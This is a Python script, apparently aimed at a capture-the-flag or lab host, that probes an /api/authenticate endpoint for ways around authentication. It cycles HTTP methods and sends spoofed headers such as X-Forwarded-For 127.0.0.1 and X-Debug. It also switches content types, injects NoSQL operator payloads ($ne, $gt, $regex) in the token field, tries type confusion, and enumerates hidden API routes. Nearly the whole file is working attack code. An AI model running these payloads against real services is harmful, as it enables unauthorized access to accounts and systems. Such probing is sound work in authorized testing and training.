import requests
import json
import time
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io"
s = requests.Session()
s.verify = False

def do_req(method, url, **kwargs):
    time.sleep(1.8)
    while True:
        try:
            r = s.request(method, url, timeout=10, **kwargs)
            if r.status_code == 502:
                time.sleep(2.5)
                continue
            return r
        except Exception as e:
            time.sleep(3.0)

print("--- 1. Testing HTTP Methods on /api/authenticate ---")
for m in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]:
    r = do_req(m, f"{BASE_URL}/api/authenticate", json={"token": "0"*48})
    print(f"{m} /api/authenticate -> {r.status_code} {r.headers.get('Allow')} {r.text[:100]}")

print("\n--- 2. Testing Headers / Authorization ---")
headers_tests = [
    {"Authorization": "Bearer 000000000000000000000000000000000000000000000000"},
    {"Authorization": "Token 000000000000000000000000000000000000000000000000"},
    {"X-API-Key": "000000000000000000000000000000000000000000000000"},
    {"Accept": "application/xml"},
    {"Accept": "text/plain"},
    {"X-Debug": "1"},
    {"X-Forwarded-For": "127.0.0.1"},
]
for h in headers_tests:
    r = do_req("POST", f"{BASE_URL}/api/authenticate", headers=h, json={"token": "0"*48})
    print(f"Header {h} -> {r.status_code} {r.text[:100]}")

print("\n--- 3. Testing Content-Types / Encodings ---")
r = do_req("POST", f"{BASE_URL}/api/authenticate", data="token=" + "0"*48, headers={"Content-Type": "application/x-www-form-urlencoded"})
print(f"urlencoded -> {r.status_code} {r.text[:100]}")

r = do_req("POST", f"{BASE_URL}/api/authenticate", data="<token>" + "0"*48 + "</token>", headers={"Content-Type": "application/xml"})
print(f"xml -> {r.status_code} {r.text[:100]}")

print("\n--- 4. Testing Extra JSON Fields & Types ---")
extra_fields = [
    {"token": "0"*48, "debug": True},
    {"token": "0"*48, "verbose": True},
    {"token": "0"*48, "explain": True},
    {"token": "0"*48, "trace": True},
    {"token": "0"*48, "env": "dev"},
    {"token": "0"*48, "action": "test"},
    {"token": "0"*48, "format": "debug"},
    {"token": "0"*48, "key": "0"*48},
    {"token": {"$ne": ""}},
    {"token": {"$gt": ""}},
    {"token": {"$regex": "^[a-zA-Z0-9]"}},
    {"token": ["0"*48]},
    {"token": 12345},
    {"token": None},
]
for p in extra_fields:
    r = do_req("POST", f"{BASE_URL}/api/authenticate", json=p)
    print(f"JSON {p} -> {r.status_code} {r.text[:100]}")

print("\n--- 5. Testing URL paths & sub-routes ---")
paths = [
    "/api/auth",
    "/api/login",
    "/api/verify",
    "/api/debug",
    "/api/config",
    "/api/keys",
    "/api/session",
    "/api/status",
]
for path in paths:
    r = do_req("GET", f"{BASE_URL}{path}")
    print(f"GET {path} -> {r.status_code} {r.text[:100]}")
